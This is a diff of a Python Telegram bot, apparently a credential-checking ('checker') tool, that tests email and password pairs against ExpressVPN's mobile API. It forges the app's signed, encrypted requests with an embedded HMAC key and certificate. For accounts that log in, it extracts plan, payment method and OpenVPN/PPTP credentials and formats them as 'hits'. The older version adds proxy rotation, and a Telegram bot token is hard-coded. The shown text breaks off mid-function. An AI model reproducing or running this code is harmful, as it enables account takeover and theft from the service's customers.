@@ -1,89 +1,138 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# ExpressVPN Telegram Bot - Production Ready
-# Author: CAT Shadow Hacker
-# Token & Admin ID: Configured
+# ExpressVPN Telegram Bot - Minimal Edition
+# Author: @X1n0q | Hex
 
-import asyncio
-import logging
-import os
-import re
 import sys
 import time
 import json
-import base64
 import gzip
-import random
-import string
-import hmac as _hmaclib
+import hmac
+import base64
 import hashlib
-from datetime import datetime, timedelta
-from dataclasses import dataclass, field
-from collections import deque, defaultdict
-from pathlib import Path
-from typing import Optional, List, Dict, Any, Tuple, Set
-from contextlib import asynccontextmanager
-import concurrent.futures
+import string
+import random
+import zipfile
+import tempfile
+import threading
+from io import BytesIO
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from threading import Event, Lock
 
-# Telegram
-from telegram import (
-    Update, InlineKeyboardButton, InlineKeyboardMarkup,
-    CallbackQuery, Chat, User, Message
-)
-from telegram.ext import (
-    Application, CommandHandler, CallbackQueryHandler,
-    MessageHandler, filters, ContextTypes, JobQueue
-)
-from telegram.constants import ParseMode
-from telegram.error import TelegramError, NetworkError, TimedOut
-
-# Third-party
 import requests
-import urllib3
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
-from cryptography.hazmat.primitives.padding import PKCS7 as CryptoPKCS7
-from cryptography import x509 as crypto_x509
-from asn1crypto import cms, core, x509 as asn1_x509
-import aiohttp
-from aiohttp_socks import ProxyConnector
+from Crypto.Cipher import AES, PKCS1_v1_5, DES3
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+from asn1crypto import cms, x509, keys
 
-# Disable warnings
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+import telebot
+from telebot import types
 
-# ── CONFIGURATION ──────────────────────────────────────────────────────────
+# ─── CONFIG ──────────────────────────────────────────────────────────────────
 BOT_TOKEN = "8136827302:AAHpATxlggGEUJ_Pw1DVB07eesKaWTlvOn8"
-ADMIN_IDS = [7305141058]
-ALLOWED_USERS = []  # Empty = allow everyone
+ADMIN_IDS = {7305141058}
+MAX_WORKERS = 4
+RESULTS_DIR = "ExpressVPN_Results"
 
-# Performance settings
-MAX_THREADS = 15
-RATE_LIMIT_PER_MINUTE = 10
-MAX_QUEUE_SIZE = 100
-PROXY_TIMEOUT = 10
-REQUEST_TIMEOUT = 30
-MAX_RETRIES = 3
-LOG_LEVEL = "INFO"
+import os
+os.makedirs(RESULTS_DIR, exist_ok=True)
 
-# ── Logging ────────────────────────────────────────────────────────────────
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=getattr(logging, LOG_LEVEL)
-)
-logger = logging.getLogger(__name__)
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
+shutdown_event = Event()
 
-# ── Constants ──────────────────────────────────────────────────────────────
-BASE_URL = "https://www.expressapisv2.net/apis/v2"
-LICENSE_URL = "https://www.expressvpn.com/api/v2/subscriptions"
-CLIENT_VER = "11.5.2"
-OS_NAME = "ios"
-OS_VER = "14.4"
-UA = f"xvclient/v21.21.0 ({OS_NAME}; {OS_VER}) ui/{CLIENT_VER}"
-SIG_VER = "2"
-SIG_ID = "91c776e"
-HMAC_KEY = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
+# ─── CRYPTO CORE ──────────────────────────────────────────────────────────────
 
-CERT_B64 = (
+class AesCryptographyService:
+    def decrypt(self, data, key, iv):
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        decrypted = cipher.decrypt(data)
+        padding_length = decrypted[-1]
+        if padding_length < 1 or padding_length > 16:
+            raise ValueError("Invalid padding")
+        return decrypted[:-padding_length]
+
+def get_byte_array(size):
+    return get_random_bytes(size)
+
+def envelope_encrypt(input_data, certificate):
+    cert = x509.Certificate.load(certificate)
+    issuer = cert.issuer
+    serial_number = cert.serial_number
+    public_key_info = cert.public_key
+    if hasattr(public_key_info, "parsed"):
+        rsa_public_key = public_key_info.parsed
+    else:
+        rsa_public_key = keys.RSAPublicKey.load(public_key_info["public_key"].parsed.dump())
+    modulus = rsa_public_key["modulus"].native
+    public_exponent = rsa_public_key["public_exponent"].native
+    rsa_key = RSA.construct((modulus, public_exponent))
+    content_key = get_random_bytes(24)
+    content_iv = get_random_bytes(8)
+    pad_length = 8 - (len(input_data) % 8) if len(input_data) % 8 != 0 else 8
+    padded_data = input_data + bytes([pad_length] * pad_length)
+    cipher = DES3.new(content_key, DES3.MODE_CBC, content_iv)
+    encrypted_content = cipher.encrypt(padded_data)
+    cipher_rsa = PKCS1_v1_5.new(rsa_key)
+    encrypted_key = cipher_rsa.encrypt(content_key)
+    recipient_id = cms.IssuerAndSerialNumber({"issuer": issuer, "serial_number": serial_number})
+    key_trans_recipient = cms.KeyTransRecipientInfo({
+        "version": 0,
+        "rid": cms.RecipientIdentifier(name="issuer_and_serial_number", value=recipient_id),
+        "key_encryption_algorithm": cms.KeyEncryptionAlgorithm({"algorithm": "1.2.840.113549.1.1.1"}),
+        "encrypted_key": cms.OctetString(encrypted_key),
+    })
+    recipient_infos = cms.RecipientInfos([cms.RecipientInfo(name="ktri", value=key_trans_recipient)])
+    encrypted_content_info = cms.EncryptedContentInfo({
+        "content_type": "1.2.840.113549.1.7.1",
+        "content_encryption_algorithm": cms.EncryptionAlgorithm({
+            "algorithm": "1.2.840.113549.3.7",
+            "parameters": cms.OctetString(content_iv),
+        }),
+        "encrypted_content": encrypted_content,
+    })
+    enveloped_data = cms.EnvelopedData({
+        "version": 0,
+        "recipient_infos": recipient_infos,
+        "encrypted_content_info": encrypted_content_info,
+    })
+    content_info = cms.ContentInfo({
+        "content_type": "1.2.840.113549.1.7.3",
+        "content": enveloped_data,
+    })
+    return content_info.dump()
+
+def gzip_data(input_string):
+    input_bytes = input_string.encode("ascii")
+    output_stream = BytesIO()
+    with gzip.GzipFile(fileobj=output_stream, mode="wb") as gz:
+        gz.write(input_bytes)
+    return output_stream.getvalue()
+
+def compute_signature(input_data, key):
+    signature = hmac.new(key, input_data, hashlib.sha1).digest()
+    return base64.b64encode(signature).decode("ascii")
+
+def generate_random_string(length=64):
+    return "".join(random.choices(string.hexdigits.lower(), k=length))
+
+def safe_int(value, default=0):
+    try:
+        if value is None:
+            return default
+        return int(float(value))
+    except (TypeError, ValueError):
+        return default
+
+def unix_time_to_date(unix_time):
+    try:
+        ts = safe_int(unix_time, None)
+        if ts is None:
+            return "N/A"
+        return datetime.fromtimestamp(ts).strftime("%Y-%m-%d")
+    except Exception:
+        return "N/A"
+
+CERT_BASE64 = (
     "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMw"
     "EQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcN"
     "MTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29t"
@@ -94,1253 +143,607 @@ CERT_B64 = (
     "DjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86Ef"
     "nKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAd"
     "BgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/"
-    "v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxX"
-    "ARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iX"
-    "JpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8k"
-    "rF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp"
-    "+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNz"
-    "OuxZ4BXLe7YA=="
+    "v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKx"
+    "XARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1i"
+    "XJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8"
+    "krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYy"
+    "fp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPSt"
+    "NzOuxZ4BXLe7YA=="
 )
+HMAC_KEY = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
 
-# ── Proxy Parser ───────────────────────────────────────────────────────────
-def parse_proxy_line(line: str) -> Optional[str]:
-    line = line.strip()
-    if not line or line.startswith(('#', '//', ';')):
-        return None
-    if line.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
-        return line
-    if '@' in line and ':' in line.split('@')[0]:
-        return f"http://{line}"
-    parts = line.split(':')
-    if len(parts) == 2:
-        host, port = parts
-        if port.isdigit():
-            return f"http://{host}:{port}"
-    if len(parts) == 4:
-        user, passwd, host, port = parts
-        if port.isdigit():
-            return f"http://{user}:{passwd}@{host}:{port}"
-    return None
+# ─── FORMATTERS ─────────────────────────────────────────────────────────────
 
-def parse_proxy_file(content: str) -> List[str]:
-    proxies = []
-    for line in content.splitlines():
-        parsed = parse_proxy_line(line)
-        if parsed:
-            proxies.append(parsed)
-    return proxies
+def format_hit(account_data, is_premium):
+    lines = []
+    lines.append("─" * 39)
+    lines.append("  EXPRESSVPN ACCOUNT REPORT")
+    lines.append("─" * 39)
+    lines.append(f"  Email       : {account_data.get('email', 'N/A')}")
+    lines.append(f"  Password    : {account_data.get('password', 'N/A')}")
+    lines.append(f"  Status      : {'Premium' if is_premium else 'Free'}")
+    lines.append(f"  License     : {account_data.get('license_status', 'N/A')}")
+    
+    if account_data.get("plan_name") and account_data["plan_name"] not in ("Not Provided", "N/A", None):
+        lines.append(f"  Plan        : {account_data['plan_name']}")
+    if account_data.get("billing_cycle"):
+        lines.append(f"  Billing     : {account_data['billing_cycle']} months")
+    if account_data.get("expire_date") and account_data["expire_date"] not in ("Not Provided", "N/A"):
+        lines.append(f"  Expires     : {account_data['expire_date']}")
+    if account_data.get("days_left") is not None and account_data["days_left"] not in ("Not Provided", "N/A"):
+        lines.append(f"  Days Left   : {account_data['days_left']}")
+    if account_data.get("auto_renew") and account_data["auto_renew"] not in ("Not Provided", "N/A"):
+        lines.append(f"  Auto Renew  : {account_data['auto_renew']}")
+    if account_data.get("payment_method") and account_data["payment_method"] not in ("Not Provided", "N/A"):
+        lines.append(f"  Payment     : {account_data['payment_method']}")
+    
+    lines.append("─" * 39)
+    lines.append("  OpenVPN Credentials")
+    lines.append(f"    Username : {account_data.get('ovpn_username', 'N/A')}")
+    lines.append(f"    Password : {account_data.get('ovpn_password', 'N/A')}")
+    
+    if account_data.get("pptp_username") and account_data.get("pptp_password"):
+        lines.append("  PPTP Credentials")
+        lines.append(f"    Username : {account_data.get('pptp_username', 'N/A')}")
+        lines.append(f"    Password : {account_data.get('pptp_password', 'N/A')}")
+    
+    lines.append("─" * 39)
+    if account_data.get("last_login") and account_data["last_login"] not in ("Not Provided", "N/A"):
+        lines.append(f"  Last Login  : {account_data['last_login']}")
+    if account_data.get("account_created") and account_data["account_created"] not in ("Not Provided", "N/A"):
+        lines.append(f"  Created     : {account_data['account_created']}")
+    
+    lines.append("─" * 39)
+    lines.append("  @X1n0q")
+    lines.append("─" * 39)
+    return "\n".join(lines)
 
-# ── Crypto Helpers ─────────────────────────────────────────────────────────
-def aes_dec(data: bytes, key: bytes, iv: bytes) -> bytes:
-    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
-    raw = dec.update(data) + dec.finalize()
-    unpadder = CryptoPKCS7(128).unpadder()
-    return unpadder.update(raw) + unpadder.finalize()
+# ─── CHECK ENGINE ────────────────────────────────────────────────────────────
 
-def aes_enc(data: bytes, key: bytes, iv: bytes) -> bytes:
-    padder = CryptoPKCS7(128).padder()
-    padded = padder.update(data) + padder.finalize()
-    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
-    return enc.update(padded) + enc.finalize()
-
-def hmac_sign(data: bytes) -> str:
-    return base64.b64encode(
-        _hmaclib.new(HMAC_KEY.encode(), data, hashlib.sha1).digest()
-    ).decode()
-
-def sig(raw: str) -> str:
-    return f"{SIG_VER} {hmac_sign(raw.encode())} {SIG_ID}"
-
-def bsig(b: bytes) -> str:
-    return f"{SIG_VER} {hmac_sign(b)} {SIG_ID}"
-
-def cms_encrypt(data: bytes) -> bytes:
-    cert_der = base64.b64decode(CERT_B64)
-    aes_key = os.urandom(16)
-    iv = os.urandom(16)
-    enc_body = aes_enc(data, aes_key, iv)
-    ccert = crypto_x509.load_der_x509_certificate(cert_der)
-    enc_key = ccert.public_key().encrypt(aes_key, asym_padding.PKCS1v15())
-    acert = asn1_x509.Certificate.load(cert_der)
-    recip = cms.RecipientInfo({
-        "ktri": cms.KeyTransRecipientInfo({
-            "version": cms.CMSVersion(0),
-            "rid": cms.RecipientIdentifier({
-                "issuer_and_serial_number": cms.IssuerAndSerialNumber({
-                    "issuer": acert["tbs_certificate"]["issuer"],
-                    "serial_number": acert["tbs_certificate"]["serial_number"],
-                })
-            }),
-            "key_encryption_algorithm": cms.KeyEncryptionAlgorithm({
-                "algorithm": "1.2.840.113549.1.1.1",
-                "parameters": core.Null(),
-            }),
-            "encrypted_key": enc_key,
-        })
-    })
-    env = cms.EnvelopedData({
-        "version": cms.CMSVersion(0),
-        "recipient_infos": cms.RecipientInfos([recip]),
-        "encrypted_content_info": cms.EncryptedContentInfo({
-            "content_type": "1.2.840.113549.1.7.1",
-            "content_encryption_algorithm": cms.EncryptionAlgorithm({
-                "algorithm": "2.16.840.1.101.3.4.1.2",
-                "parameters": core.OctetString(iv),
-            }),
-            "encrypted_content": enc_body,
-        }),
-    })
-    return cms.ContentInfo({"content_type": "1.2.840.113549.1.7.3", "content": env}).dump()
-
-# ── Core Checker ──────────────────────────────────────────────────────────
-def check_account(email: str, password: str, proxy: Optional[str] = None) -> Dict[str, Any]:
-    result = {"status": "ERROR", "email": email, "password": password, "error": None}
+def check_account(email, password):
+    account_data = {"email": email, "password": password}
     try:
-        iv_b = os.urandom(16)
-        key_b = os.urandom(16)
-        iid = "".join(random.choices(string.ascii_lowercase + string.digits, k=64))
-
-        body_json = json.dumps({
+        install_id = generate_random_string(64)
+        base64_iv = base64.b64encode(get_byte_array(16)).decode("ascii")
+        base64_key = base64.b64encode(get_byte_array(16)).decode("ascii")
+        post_data = json.dumps({
             "email": email,
-            "iv": base64.b64encode(iv_b).decode(),
-            "key": base64.b64encode(key_b).decode(),
-            "password": password
+            "iv": base64_iv,
+            "key": base64_key,
+            "password": password,
         })
-        gzipped = gzip.compress(body_json.encode(), compresslevel=9)
-        enc = cms_encrypt(gzipped)
-        qs = f"client_version={CLIENT_VER}&installation_id={iid}&os_name={OS_NAME}&os_version={OS_VER}"
-        enc_sig = bsig(enc)
-        hdr_sig = sig(f"POST /apis/v2/credentials?{qs}")
+        cert_bytes = base64.b64decode(CERT_BASE64)
+        gzipped_data = gzip_data(post_data)
+        encrypted_post_data = envelope_encrypt(gzipped_data, cert_bytes)
 
-        proxies = {"http": proxy, "https": proxy} if proxy else None
-        session = requests.Session()
-        resp = session.post(
-            f"{BASE_URL}/credentials?{qs}",
-            data=enc,
-            headers={
-                "User-Agent": UA,
-                "Content-Type": "application/octet-stream",
-                "X-Body-Compression": "gzip",
-                "X-Signature": hdr_sig,
-                "X-Body-Signature": enc_sig,
-                "Accept-Language": "en",
-                "Accept-Encoding": "gzip, deflate"
-            },
-            proxies=proxies,
-            timeout=REQUEST_TIMEOUT,
-            verify=False
-        )
-
-        if resp.status_code in (400, 401):
-            result["status"] = "BAD"
-            session.close()
-            return result
-        if resp.status_code == 500:
-            result["status"] = "BAN"
-            session.close()
-            return result
-        if resp.status_code != 200:
-            result["status"] = "ERROR"
-            result["error"] = f"HTTP {resp.status_code}"
-            session.close()
-            return result
-
-        try:
-            body = aes_dec(resp.content, key_b, iv_b).decode("utf-8", errors="ignore")
-        except Exception as e:
-            result["status"] = "ERROR"
-            result["error"] = f"Decrypt: {str(e)[:50]}"
-            session.close()
-            return result
-
-        token_match = re.search(r'"access_token":"([^"]+)"', body)
-        if not token_match:
-            result["status"] = "BAD"
-            session.close()
-            return result
-        token = token_match.group(1)
-
-        ovpn_user = re.search(r'"ovpn_username":"([^"]+)"', body)
-        ovpn_pass = re.search(r'"ovpn_password":"([^"]+)"', body)
-        ovpn = f"{ovpn_user.group(1)}:{ovpn_pass.group(1)}" if ovpn_user and ovpn_pass else ""
-
-        sub_qs = (
-            f"access_token={token}&client_version={CLIENT_VER}"
-            f"&installation_id={iid}&os_name={OS_NAME}&os_version={OS_VER}"
-            f"&reason=activation_with_email"
-        )
-        sub_sig = sig(f"GET /apis/v2/subscription?{sub_qs}")
-        batch_str = (
-            f'[{{"headers":{{"Accept-Language":"en","X-Signature":"{sub_sig}"}},'
-            f'"method":"GET","url":"/apis/v2/subscription?{sub_qs}"}}]'
-        )
-        batch_qs = qs
-        b_sig = sig(f"POST /apis/v2/batch?{batch_qs}")
-        bb_sig = bsig(batch_str.encode())
-
-        br = session.post(
-            f"{BASE_URL}/batch?{batch_qs}",
-            data=batch_str,
-            headers={
-                "User-Agent": UA,
-                "X-Body-Compression": "gzip",
-                "X-Signature": b_sig,
-                "X-Body-Signature": bb_sig,
-                "Accept-Language": "en",
-                "Accept-Encoding": "gzip, deflate"
-            },
-            proxies=proxies,
-            timeout=REQUEST_TIMEOUT,
-            verify=False
-        )
-        bt = br.text or ""
-
-        if "subscription" not in bt:
-            result.update({"status": "EXPIRED", "ovpn": ovpn, "plan": "Unknown", "expire": ""})
-            session.close()
-            return result
-
-        ue = bt.encode().decode("unicode_escape", errors="replace")
-
-        def extract(pattern: str, text: str = ue) -> str:
-            m = re.search(pattern, text)
-            return m.group(1) if m else ""
-
-        plan_match = re.search(r'billing_cycle":(\d+)', ue)
-        plan = f"{plan_match.group(1)} Month" if plan_match else "Unknown"
-
-        exp_match = re.search(r'expiration_time":(\d+)', ue)
-        exp_ts = int(exp_match.group(1)) if exp_match else 0
-        now = time.time()
-        days = max(0, round((exp_ts - now) / 86400)) if exp_ts > now else 0
-        expire = datetime.fromtimestamp(exp_ts).strftime("%Y-%m-%d") if exp_ts else ""
-
-        payment = extract(r'payment_method":"([^"]+)"')
-        sub_status_match = re.search(r'"(?:subscription_)?status"\s*:\s*"([^"]+)"', ue, re.I)
-        sub_status = sub_status_match.group(1).upper() if sub_status_match else "ACTIVE"
-        auto_match = re.search(r'auto_bill":([^,}]+)', ue)
-        auto_bill = (auto_match.group(1).strip().lower() == "true") if auto_match else False
-
-        if (exp_ts and exp_ts < now) or (sub_status == "REVOKED" and not (exp_ts and exp_ts > now)):
-            result.update({"status": "EXPIRED", "plan": plan, "expire": expire, "ovpn": ovpn})
-            session.close()
-            return result
-
-        license_key = ""
-        try:
-            lr = session.get(
-                LICENSE_URL,
-                headers={
-                    "Authorization": f"Bearer {token}",
-                    "x-tenant": "xvpn",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-                },
-                proxies=proxies,
-                timeout=10,
-                verify=False
-            )
-            codes = re.findall(r'longCode":"([^"]+)"', lr.text)
-            license_key = codes[-1] if codes else ""
-        except Exception:
-            pass
-
-        session.close()
-        result.update({
-            "status": "HIT",
-            "plan": plan,
-            "expire": expire,
-            "days": days,
-            "payment": payment,
-            "auto_bill": auto_bill,
-            "license": license_key,
-            "ovpn": ovpn
-        })
-        return result
-
-    except requests.exceptions.Timeout:
-        result["status"] = "ERROR"
-        result["error"] = "Timeout"
-        return result
-    except requests.exceptions.ProxyError:
-        result["status"] = "ERROR"
-        result["error"] = "Proxy error"
-        return result
-    except Exception as e:
-        result["status"] = "ERROR"
-        result["error"] = str(e)[:60]
-        return result
-
-# ── User State Manager ─────────────────────────────────────────────────────
-class UserState:
-    def __init__(self):
-        self.current_job: Optional[Dict[str, Any]] = None
-        self.job_queue: List[Dict[str, Any]] = []
-        self.proxies: List[str] = []
-        self.last_command_time: datetime = datetime.now()
-        self.command_count: int = 0
-        self.results: List[Dict[str, Any]] = []
-        self.is_processing: bool = False
-        self.progress: Dict[str, Any] = {
-            "total": 0,
-            "checked": 0,
-            "hits": 0,
-            "expired": 0,
-            "bad": 0,
-            "errors": 0
+        header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
+        header_signature = compute_signature(header_raw.encode("ascii"), HMAC_KEY.encode("ascii"))
+        body_signature = compute_signature(encrypted_post_data, HMAC_KEY.encode("ascii"))
+        
+        url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
+        headers = {
+            "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
+            "Content-Type": "application/octet-stream",
+            "X-Body-Compression": "gzip",
+            "X-Signature": f"2 {header_signature} 91c776e",
+            "X-Body-Signature": f"2 {body_signature} 91c776e",
+            "Accept-Language": "en",
+            "Accept-Encoding": "gzip, deflate",
         }
 
-class BotState:
-    def __init__(self):
-        self.users: Dict[int, UserState] = defaultdict(UserState)
-        self.total_checks: int = 0
-        self.total_hits: int = 0
-        self.is_maintenance: bool = False
-        self.start_time: datetime = datetime.now()
-        self.error_log: List[str] = []
+        resp = requests.post(url, data=encrypted_post_data, headers=headers, timeout=30)
 
-    def get_user(self, user_id: int) -> UserState:
-        return self.users[user_id]
+        if resp.status_code == 401:
+            return "invalid", "Invalid credentials"
+        if resp.status_code == 429:
+            time.sleep(5)
+            return check_account(email, password)
+        if resp.status_code != 200:
+            return "invalid", f"HTTP {resp.status_code}"
 
-bot_state = BotState()
+        aes = AesCryptographyService()
+        plain = aes.decrypt(resp.content, base64.b64decode(base64_key), base64.b64decode(base64_iv))
+        resp_json = json.loads(plain.decode("ascii"))
 
-# ── Rate Limiter ───────────────────────────────────────────────────────────
-class RateLimiter:
-    def __init__(self, max_requests_per_minute: int = 10):
-        self.max_requests = max_requests_per_minute
-        self.user_requests: Dict[int, List[float]] = defaultdict(list)
+        for k in ("ovpn_username", "ovpn_password", "pptp_username", "pptp_password"):
+            if k in resp_json:
+                account_data[k] = resp_json[k]
 
-    def is_allowed(self, user_id: int) -> bool:
-        now = time.time()
-        cutoff = now - 60
-        self.user_requests[user_id] = [t for t in self.user_requests[user_id] if t > cutoff]
-        if len(self.user_requests[user_id]) >= self.max_requests:
-            return False
-        self.user_requests[user_id].append(now)
-        return True
+        access_token = resp_json.get("access_token")
+        if not access_token:
+            account_data["license_status"] = "No subscription"
+            return "free", account_data
 
-rate_limiter = RateLimiter(RATE_LIMIT_PER_MINUTE)
+        sub_raw = f"GET /apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
+        sub_sig = compute_signature(sub_raw.encode("ascii"), HMAC_KEY.encode("ascii"))
+        batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
+        batch_sig = compute_signature(batch_raw.encode("ascii"), HMAC_KEY.encode("ascii"))
+        
+        capture_body = json.dumps([{
+            "headers": {"Accept-Language": "en", "X-Signature": f"2 {sub_sig} 91c776e"},
+            "method": "GET",
+            "url": f"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email",
+        }])
+        capture_body_sig = compute_signature(capture_body.encode("ascii"), HMAC_KEY.encode("ascii"))
+        
+        batch_url = f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
+        batch_headers = {
+            "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
+            "X-Body-Compression": "gzip",
+            "X-Signature": f"2 {batch_sig} 91c776e",
+            "X-Body-Signature": f"2 {capture_body_sig} 91c776e",
+            "Accept-Language": "en",
+            "Accept-Encoding": "gzip, deflate",
+            "Content-Type": "application/json",
+        }
 
-# ── Helper Functions ──────────────────────────────────────────────────────
-def is_admin(user_id: int) -> bool:
+        br = requests.post(batch_url, data=capture_body, headers=batch_headers, timeout=30)
+
+        if br.status_code == 429:
+            time.sleep(5)
+            return check_account(email, password)
+        if br.status_code != 200:
+            account_data["license_status"] = f"Batch HTTP {br.status_code}"
+            return "free", account_data
+
+        batch_data = br.json()
+        if not batch_data:
+            account_data["license_status"] = "Empty response"
+            return "free", account_data
+
+        item = batch_data[0]
+        sub_data = item.get("body", "{}")
+        if isinstance(sub_data, str):
+            sub_data = sub_data.replace('\\"', '"')
+            sub_json = json.loads(sub_data)
+        else:
+            sub_json = sub_data
+
+        if "subscription" in sub_json:
+            sub_json = sub_json["subscription"]
+
+        billing_cycle = sub_json.get("billing_cycle")
+        if billing_cycle:
+            account_data["billing_cycle"] = billing_cycle
+            account_data["plan"] = f"{billing_cycle} Month"
+        
+        if "expiration_time" in sub_json:
+            exp_time = sub_json["expiration_time"]
+            account_data["expire_date"] = unix_time_to_date(exp_time)
+            exp_ts = safe_int(exp_time, None)
+            if exp_ts is not None:
+                account_data["days_left"] = int((exp_ts - int(datetime.now().timestamp())) / 86400)
+
+        if "auto_bill" in sub_json:
+            account_data["auto_renew"] = str(sub_json["auto_bill"]).lower()
+        if "payment_method" in sub_json:
+            account_data["payment_method"] = sub_json["payment_method"]
+        if "plan_name" in sub_json and sub_json["plan_name"]:
+            account_data["plan_name"] = sub_json["plan_name"]
+
+        license_status = str(sub_json.get("license_status", "")).upper()
+        account_data["license_status"] = license_status
+
+        if license_status == "REVOKED":
+            return "free", account_data
+        if license_status in ("ACTIVE", "TRIAL", "PAID"):
+            exp_time = sub_json.get("expiration_time")
+            exp_ts = safe_int(exp_time, 0)
+            if exp_ts and exp_ts > int(datetime.now().timestamp()):
+                account_data["is_premium"] = True
+                return "premium", account_data
+            return "free", account_data
+        return "free", account_data
+
+    except Exception as e:
+        return "invalid", str(e)[:120]
+
+# ─── SESSION STATE ────────────────────────────────────────────────────────────
+
+user_sessions = {}
+sessions_lock = Lock()
+
+def get_session(chat_id):
+    with sessions_lock:
+        if chat_id not in user_sessions:
+            user_sessions[chat_id] = {
+                "accounts": [],
+                "running": False,
+                "stop": False,
+                "stats": {"checked": 0, "total": 0, "premium": 0, "free": 0, "invalid": 0},
+                "premium_hits": [],
+                "free_hits": [],
+                "invalid_hits": [],
+                "status_msg_id": None,
+                "start_time": None,
+            }
+        return user_sessions[chat_id]
+
+def is_allowed(user_id):
     return user_id in ADMIN_IDS
 
-def is_allowed(user_id: int) -> bool:
-    if not ALLOWED_USERS:
-        return True
-    return user_id in ALLOWED_USERS or is_admin(user_id)
+# ─── KEYBOARD MARKUP ────────────────────────────────────────────────────────
 
-def format_result(result: Dict[str, Any]) -> str:
-    status = result.get("status", "UNKNOWN")
-    email = result.get("email", "")
-    password = result.get("password", "")
+def main_menu():
+    keyboard = types.InlineKeyboardMarkup(row_width=2)
+    btn1 = types.InlineKeyboardButton("Start Check", callback_data="start_check")
+    btn2 = types.InlineKeyboardButton("Status", callback_data="status")
+    btn3 = types.InlineKeyboardButton("Results", callback_data="results")
+    btn4 = types.InlineKeyboardButton("Help", callback_data="help")
+    keyboard.add(btn1, btn2)
+    keyboard.add(btn3, btn4)
+    return keyboard
 
-    if status == "HIT":
-        plan = result.get("plan", "Unknown")
-        expire = result.get("expire", "N/A")
-        days = result.get("days", 0)
-        license_key = result.get("license", "")
-        ovpn = result.get("ovpn", "")
-        payment = result.get("payment", "")
-        auto_bill = "✓" if result.get("auto_bill") else "✗"
+# ─── TELEGRAM HANDLERS ───────────────────────────────────────────────────────
 
-        lines = [
-            f"✅ <b>HIT</b>",
-            f"📧 <code>{email}</code>",
-            f"🔑 <code>{password}</code>",
-            f"📅 Plan: <b>{plan}</b>",
-            f"⏳ Expires: {expire} ({days} days)",
-            f"💳 Payment: {payment or 'N/A'}",
-            f"🔄 Auto-bill: {auto_bill}",
-        ]
-        if license_key:
-            lines.append(f"🔐 License: <code>{license_key}</code>")
-        if ovpn:
-            lines.append(f"🖧 OVPN: <code>{ovpn}</code>")
-        return "\n".join(lines)
+@bot.message_handler(commands=["start", "help"])
+def cmd_start(message):
+    if not is_allowed(message.from_user.id):
+        bot.reply_to(message, "Access denied.")
+        return
 
-    elif status == "EXPIRED":
-        plan = result.get("plan", "Unknown")
-        expire = result.get("expire", "N/A")
-        ovpn = result.get("ovpn", "")
-        lines = [
-            f"⚠️ <b>EXPIRED</b>",
-            f"📧 <code>{email}</code>",
-            f"🔑 <code>{password}</code>",
